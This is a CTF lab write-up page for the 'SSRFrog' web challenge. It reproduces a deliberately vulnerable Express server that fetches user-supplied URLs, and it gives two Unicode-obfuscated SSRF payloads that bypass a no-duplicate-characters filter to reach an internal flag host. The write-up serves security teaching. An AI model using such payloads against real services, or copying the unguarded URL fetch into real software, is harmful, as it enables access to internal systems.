<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple Web 0x13(Lab - SSRFrog)
  #


  tags: NTUSTWS CTF Web
  #

Challenge: http://h4ck3r.quest:8501/

  Background
  #

javascript Set()
Web Hacking | 續章【EDU-CTF 2021】
網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」

  Source code
  #

:::spoiler source code
const express = require("express");
const http = require("http");

const app = express();

app.get("/source", (req, res) => {
    return res.sendFile(__filename);
})
app.get(&#39;/&#39;, (req, res) => {
    const { url } = req.query;
    if (!url || typeof url !== &#39;string&#39;) return res.sendFile(__dirname + "/index.html");

    // no duplicate characters in `url`
    if (url.length !== new Set(url).size) return res.sendFile(__dirname + "/frog.png");

    try {
        http.get(url, resp => {
            resp.setEncoding("utf-8");
            resp.statusCode === 200 ? resp.on(&#39;data&#39;, data => res.send(data)) : res.send(":(");
        }).on(&#39;error&#39;, () => res.send("WTF?"));
    } catch (error) {
        res.send("WTF?");
    }
});

app.listen(3000, &#39;0.0.0.0&#39;);
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Web 0x13(Lab - SSRFrog)"><meta property="og:description" content='Simple Web 0x13(Lab - SSRFrog) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8501/
Background # javascript Set() Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Source code # :::spoiler source code
const express = require("express"); const http = require("http"); const app = express(); app.get("/source", (req, res) => { return res.sendFile(__filename); }) app.get(&#39;/&#39;, (req, res) => { const { url } = req.query; if (!url || typeof url !== &#39;string&#39;) return res.sendFile(__dirname + "/index.html"); // no duplicate characters in `url` if (url.length !== new Set(url).size) return res.sendFile(__dirname + "/frog.png"); try { http.get(url, resp => { resp.setEncoding("utf-8"); resp.statusCode === 200 ? resp.on(&#39;data&#39;, data => res.send(data)) : res.send(":("); }).on(&#39;error&#39;, () => res.send("WTF?")); } catch (error) { res.send("WTF?"); } }); app.listen(3000, &#39;0.0.0.0&#39;); :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="NTUSTWS"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web"><title>Simple Web 0x13(Lab - SSRFrog) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Web 0x13(Lab - SSRFrog)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-web-0x13lab---ssrfrog>Simple Web 0x13(Lab - SSRFrog)
<a class=anchor href=#simple-web-0x13lab---ssrfrog>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8501/>http://h4ck3r.quest:8501/</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://pjchender.dev/javascript/js-set/>javascript Set()</a>
<a href="https://youtu.be/hWC-Evt-sBc?t=9867">Web Hacking | 續章【EDU-CTF 2021】</a>
<a href=https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362>網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler source code</p><pre tabindex=0><code class="language-javascript=" data-lang="javascript=">const express = require(&#34;express&#34;);
const http = require(&#34;http&#34;);

const app = express();

app.get(&#34;/source&#34;, (req, res) =&gt; {
    return res.sendFile(__filename);
})
app.get(&#39;/&#39;, (req, res) =&gt; {
    const { url } = req.query;
    if (!url || typeof url !== &#39;string&#39;) return res.sendFile(__dirname + &#34;/index.html&#34;);

    // no duplicate characters in `url`
    if (url.length !== new Set(url).size) return res.sendFile(__dirname + &#34;/frog.png&#34;);

    try {
        http.get(url, resp =&gt; {
            resp.setEncoding(&#34;utf-8&#34;);
            resp.statusCode === 200 ? resp.on(&#39;data&#39;, data =&gt; res.send(data)) : res.send(&#34;:(&#34;);
        }).on(&#39;error&#39;, () =&gt; res.send(&#34;WTF?&#34;));
    } catch (error) {
        res.send(&#34;WTF?&#34;);
    }
});

app.listen(3000, &#39;0.0.0.0&#39;);
</code></pre><p>:::</p><ul><li>Simply speaking, it&rsquo;ll call a <code>Set()</code> object that will filter duplicate characters</li><li>We also can find the hint in page source
<img src=https://i.imgur.com/AxoVKnp.png alt></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ol><li>The hint said flag is on <code>http://the.c0o0o0l-fl444g.server.internal:80</code>, so we need to meet the first requirement - every single character is unique.
We can use <a href=https://splitline.github.io/domain-obfuscator/>Domain Obfuscator</a> to replace the similar characters.</li><li>Payload
<code>htTp:/\ⓉₕE．ℭ⓪ᴼ₀o０Ⅼ-Ⓕｌ₄4４ⓖ｡ₛⒺʳⓋₑⓇ.㏌ₜｅᴿ㎁ˡ</code>
<code>htTp:/\ⓉｈE。Ⅽ⁰ₒ０O0ℓ-ｆᴸ④４⁴G．ＳＥRｖⅇⓡ.ⁱNｔₑrｎAℒ</code></li></ol><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://ctftime.org/writeup/25763>SSRFrog</a>
<a href=https://www.punycoder.com/>Punycode converter</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>